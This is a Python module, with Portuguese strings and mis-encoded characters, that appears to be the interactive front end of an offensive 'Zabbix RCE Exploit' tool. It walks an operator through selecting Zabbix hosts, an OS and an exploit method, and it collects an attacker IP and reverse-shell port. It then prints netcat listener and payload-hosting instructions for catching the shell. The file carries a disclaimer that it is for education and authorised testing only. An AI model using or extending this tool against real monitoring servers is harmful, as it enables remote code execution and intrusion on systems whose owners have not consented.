"""
M√≥dulo de interface de usu√°rio para o Zabbix RCE Exploit
Gerencia toda intera√ß√£o com o usu√°rio e exibi√ß√£o de informa√ß√µes
"""

import sys
from typing import List, Dict, Tuple, Optional
from .os_detector import OSDetector


class UserInterface:
    """Interface de usu√°rio para o exploit"""
    
    def __init__(self, api_client, exploit_manager, payload_generator):
        self.api_client = api_client
        self.exploit_manager = exploit_manager
        self.payload_generator = payload_generator
        self.os_detector = OSDetector()
    
    def display_banner(self):
        """Exibe banner da aplica√ß√£o"""
        banner = """
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó
‚ïë                    ZABBIX RCE EXPLOIT v2.0                  ‚ïë
‚ïë                                                              ‚ïë
‚ïë  üéØ Exploit de Execu√ß√£o Remota de C√≥digo para Zabbix Agent  ‚ïë
‚ïë  üìö Vers√£o Educacional - Use apenas em ambientes autorizados ‚ïë
‚ïë                                                              ‚ïë
‚ïë  Autor: Zabbix RCE Team                                      ‚ïë
‚ïë  Vers√£o: 2.0.0                                               ‚ïë
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù
        """
        print(banner)
        
        # Aviso de responsabilidade
        print("‚ö†Ô∏è  AVISO IMPORTANTE:")
        print("   Esta ferramenta √© destinada APENAS para fins educacionais")
        print("   e testes de seguran√ßa autorizados. O uso inadequado pode")
        print("   violar leis e pol√≠ticas. Use sob sua pr√≥pria responsabilidade.\n")
    
    def main_menu(self) -> str:
        """Exibe menu principal e retorna escolha do usu√°rio"""
        print("\n" + "="*60)
        print("üìã MENU PRINCIPAL")
        print("="*60)
        print("1. üöÄ Implantar Exploit")
        print("2. üìã Listar Hosts")
        print("3. üßπ Limpar Exploits")
        print("4. üîç Testar Conex√£o")
        print("5. ‚öôÔ∏è  Exibir Configura√ß√µes")
        print("6. üö™ Sair")
        print("="*60)
        
        while True:
            try:
                choice = input("Escolha uma op√ß√£o (1-6): ").strip()
                if choice in ['1', '2', '3', '4', '5', '6']:
                    return choice
                else:
                    print("‚ùå Op√ß√£o inv√°lida. Digite um n√∫mero de 1 a 6.")
            except KeyboardInterrupt:
                print("\n")
                return '6'
    
    def display_hosts_table(self, hosts: List[Dict]):
        """Exibe tabela de hosts dispon√≠veis"""
        if not hosts:
            self.display_warning("Nenhum host encontrado")
            return
        
        print("\n" + "="*100)
        print("üìã HOSTS DISPON√çVEIS")
        print("="*100)
        print(f"{'ID':<3} {'Host':<20} {'Nome':<25} {'SO Detectado':<12} {'Interfaces':<15} {'Status'}")
        print("-"*100)
        
        for i, host in enumerate(hosts, 1):
            host_name = host.get('host', 'N/A')
            display_name = host.get('name', 'N/A')
            
            # Detecta sistema operacional
            detected_os = self.os_detector.detect_os(host)
            os_display = f"{detected_os['os_type']} ({detected_os['confidence']:.0%})"
            
            # Conta interfaces
            interfaces_count = len(host.get('interfaces', []))
            interfaces_display = f"{interfaces_count} interface(s)"
            
            # Status do host
            status = "Ativo" if host.get('status') == '0' else "Inativo"
            
            # Trunca strings longas
            if len(host_name) > 19:
                host_name = host_name[:16] + "..."
            if len(display_name) > 24:
                display_name = display_name[:21] + "..."
            
            print(f"{i:<3} {host_name:<20} {display_name:<25} {os_display:<12} {interfaces_display:<15} {status}")
        
        print("="*100)
    
    def select_host(self, hosts: List[Dict]) -> Optional[Dict]:
        """Permite usu√°rio selecionar um host"""
        while True:
            try:
                print(f"\nüìç Selecione um host (1-{len(hosts)}) ou 'c' para cancelar:")
                choice = input("Op√ß√£o: ").strip().lower()
                
                if choice == 'c':
                    return None
                
                index = int(choice) - 1
                if 0 <= index < len(hosts):
                    selected_host = hosts[index]
                    print(f"‚úÖ Host selecionado: {selected_host['host']}")
                    return selected_host
                else:
                    print(f"‚ùå Op√ß√£o inv√°lida. Digite um n√∫mero de 1 a {len(hosts)}")
                    
            except ValueError:
                print("‚ùå Digite um n√∫mero v√°lido ou 'c' para cancelar")
            except KeyboardInterrupt:
                return None
    
    def select_interface(self, host: Dict) -> Optional[Tuple[Dict, int]]:
        """Permite usu√°rio selecionar uma interface do host"""
        interfaces = host.get('interfaces', [])
        
        if not interfaces:
            self.display_error(f"Host '{host['host']}' n√£o possui interfaces dispon√≠veis")
            return None
        
        if len(interfaces) == 1:
            interface = interfaces[0]
            print(f"‚úÖ Interface √∫nica selecionada: {interface.get('ip', 'N/A')}:{interface.get('port', 'N/A')}")
            return interface, 0
        
        print(f"\nüîå Interfaces dispon√≠veis para '{host['host']}':")
        print("-"*60)
        
        for i, interface in enumerate(interfaces, 1):
            ip = interface.get('ip', 'N/A')
            port = interface.get('port', 'N/A')
            interface_type = interface.get('type', 'N/A')
            print(f"{i}. IP: {ip:<15} Porta: {port:<6} Tipo: {interface_type}")
        
        while True:
            try:
                choice = input(f"\nSelecione uma interface (1-{len(interfaces)}) ou 'c' para cancelar: ").strip().lower()
                
                if choice == 'c':
                    return None
                
                index = int(choice) - 1
                if 0 <= index < len(interfaces):
                    interface = interfaces[index]
                    print(f"‚úÖ Interface selecionada: {interface.get('ip', 'N/A')}:{interface.get('port', 'N/A')}")
                    return interface, index
                else:
                    print(f"‚ùå Op√ß√£o inv√°lida. Digite um n√∫mero de 1 a {len(interfaces)}")
                    
            except ValueError:
                print("‚ùå Digite um n√∫mero v√°lido ou 'c' para cancelar")
            except KeyboardInterrupt:
                return None
    
    def select_os_type(self, host: Dict) -> Optional[str]:
        """Permite usu√°rio selecionar/confirmar sistema operacional"""
        # Detecta automaticamente
        detection_result = self.os_detector.detect_os(host)
        detected_os = detection_result['os_type']
        confidence = detection_result['confidence']
        
        print(f"\nüîç Detec√ß√£o de Sistema Operacional:")
        print(f"   Host: {host['host']}")
        print(f"   SO Detectado: {detected_os.upper()}")
        print(f"   Confian√ßa: {confidence:.0%}")
        
        if confidence >= 0.7:
            print(f"‚úÖ Detec√ß√£o com alta confian√ßa")
        else:
            print(f"‚ö†Ô∏è  Detec√ß√£o com baixa confian√ßa - recomenda-se verifica√ß√£o manual")
        
        print("\nOp√ß√µes:")
        print("1. üêß Linux")
        print("2. üñ•Ô∏è  Windows") 
        print(f"3. ‚úÖ Usar detec√ß√£o autom√°tica ({detected_os.upper()})")
        print("4. ‚ùå Cancelar")
        
        while True:
            try:
                choice = input("Escolha o sistema operacional (1-4): ").strip()
                
                if choice == '1':
                    return 'linux'
                elif choice == '2':
                    return 'windows'
                elif choice == '3':
                    return detected_os.lower()
                elif choice == '4':
                    return None
                else:
                    print("‚ùå Op√ß√£o inv√°lida. Digite um n√∫mero de 1 a 4.")
                    
            except KeyboardInterrupt:
                return None
    
    def select_exploit_method(self, os_type: str) -> Optional[str]:
        """Permite usu√°rio selecionar m√©todo de exploit"""
        methods = self.payload_generator.get_available_methods(os_type)
        
        if not methods:
            self.display_error(f"Nenhum m√©todo dispon√≠vel para {os_type}")
            return None
        
        print(f"\n‚ö° M√©todos de Exploit para {os_type.upper()}:")
        print("-"*60)
        
        for i, method in enumerate(methods, 1):
            description = self.payload_generator.get_method_description(os_type, method)
            print(f"{i}. {method.upper()}")
            print(f"   {description}")
            print()
        
        print(f"{len(methods) + 1}. ‚ùå Cancelar")
        
        while True:
            try:
                choice = input(f"Selecione um m√©todo (1-{len(methods) + 1}): ").strip()
                choice_int = int(choice)
                
                if 1 <= choice_int <= len(methods):
                    selected_method = methods[choice_int - 1]
                    print(f"‚úÖ M√©todo selecionado: {selected_method.upper()}")
                    return selected_method
                elif choice_int == len(methods) + 1:
                    return None
                else:
                    print(f"‚ùå Op√ß√£o inv√°lida. Digite um n√∫mero de 1 a {len(methods) + 1}")
                    
            except ValueError:
                print("‚ùå Digite um n√∫mero v√°lido")
            except KeyboardInterrupt:
                return None
    
    def get_exploit_parameters(self, default_ip: str) -> Optional[Tuple[str, int]]:
        """Obt√©m par√¢metros do exploit do usu√°rio"""
        print(f"\n‚öôÔ∏è  Configura√ß√£o de Par√¢metros:")
        
        # IP do atacante
        while True:
            ip_input = input(f"IP do atacante [{default_ip}]: ").strip()
            ip_shell = ip_input if ip_input else default_ip
            
            # Valida√ß√£o b√°sica de IP
            if self._validate_ip(ip_shell):
                break
            else:
                print("‚ùå IP inv√°lido. Digite um endere√ßo IP v√°lido.")
        
        # Porta para reverse shell
        while True:
            try:
                port_input = input("Porta para reverse shell [4444]: ").strip()
                port = int(port_input) if port_input else 4444
                
                if 1 <= port <= 65535:
                    break
                else:
                    print("‚ùå Porta inv√°lida. Digite um n√∫mero de 1 a 65535.")
                    
            except ValueError:
                print("‚ùå Digite um n√∫mero v√°lido para a porta.")
            except KeyboardInterrupt:
                return None
        
        return ip_shell, port
    
    def confirm_exploit_deployment(self, host: Dict, os_type: str, method: str, ip_shell: str, port: int) -> bool:
        """Solicita confirma√ß√£o final antes de implantar exploit"""
        print("\n" + "="*60)
        print("üö® CONFIRMA√á√ÉO DE IMPLANTA√á√ÉO")
        print("="*60)
        print(f"Host Alvo: {host['host']}")
        print(f"Sistema Operacional: {os_type.upper()}")
        print(f"M√©todo: {method.upper()}")
        print(f"IP Atacante: {ip_shell}")
        print(f"Porta: {port}")
        print("="*60)
        
        print("\n‚ö†Ô∏è  ATEN√á√ÉO:")
        print("   - Certifique-se de ter autoriza√ß√£o para este teste")
        print("   - Prepare seu listener antes de confirmar")
        print("   - Esta a√ß√£o criar√° itens no Zabbix")
        
        while True:
            try:
                confirm = input("\nüöÄ Confirma implanta√ß√£o do exploit? (s/n): ").strip().lower()
                if confirm in ['s', 'sim', 'y', 'yes']:
                    return True
                elif confirm in ['n', 'nao', 'n√£o', 'no']:
                    return False
                else:
                    print("‚ùå Digite 's' para sim ou 'n' para n√£o")
            except KeyboardInterrupt:
                return False
    
    def display_post_exploit_instructions(self, os_type: str, method: str, ip_shell: str, port: int):
        """Exibe instru√ß√µes p√≥s-exploit"""
        print("\n" + "="*70)
        print("‚úÖ EXPLOIT IMPLANTADO COM SUCESSO!")
        print("="*70)
        
        print("\nüìã Pr√≥ximos Passos:")
        
        if os_type.lower() == 'windows' and method == 'powershell':
            print(f"1. üåê Inicie um servidor HTTP na pasta 'payloads':")
            print(f"   cd payloads")
            print(f"   python -m http.server 8000")
            print()
            print(f"2. üéß Configure seu listener:")
            print(f"   nc -lvnp {port}")
            print()
            print(f"3. ‚è±Ô∏è  Aguarde conex√£o em aproximadamente 60 segundos")
            
        else:
            print(f"1. üéß Configure seu listener:")
            print(f"   nc -lvnp {port}")
            print()
            print(f"2. ‚è±Ô∏è  Aguarde conex√£o em aproximadamente 60 segundos")
        
        print("\nüßπ Limpeza:")
        print("   Use a op√ß√£o 3 do menu principal para remover itens criados")
        
        print("\n‚ö†Ô∏è  Lembre-se:")
        print("   - Monitore seus logs de seguran√ßa")
        print("   - Remova itens ap√≥s o teste")
        print("   - Documente os resultados")
        
        print("="*70)
    
    def display_success(self, message: str):
        """Exibe mensagem de sucesso"""
        print(f"‚úÖ {message}")
    
    def display_error(self, message: str):
        """Exibe mensagem de erro"""
        print(f"‚ùå {message}")
    
    def display_warning(self, message: str):
        """Exibe mensagem de aviso"""
        print(f"‚ö†Ô∏è  {message}")
    
    def display_info(self, message: str):
        """Exibe mensagem informativa"""
        print(f"‚ÑπÔ∏è  {message}")
    
    def pause_for_user(self, message: str = "\nPressione Enter para continuar..."):
        """Pausa execu√ß√£o aguardando usu√°rio"""
        try:
            input(message)
        except KeyboardInterrupt:
            pass
    
    def _validate_ip(self, ip: str) -> bool:
        """Valida√ß√£o b√°sica de endere√ßo IP"""
        parts = ip.split('.')
        if len(parts) != 4:
            return False
        
        try:
            for part in parts:
                num = int(part)
                if not 0 <= num <= 255:
                    return False
            return True
        except ValueError:
            return False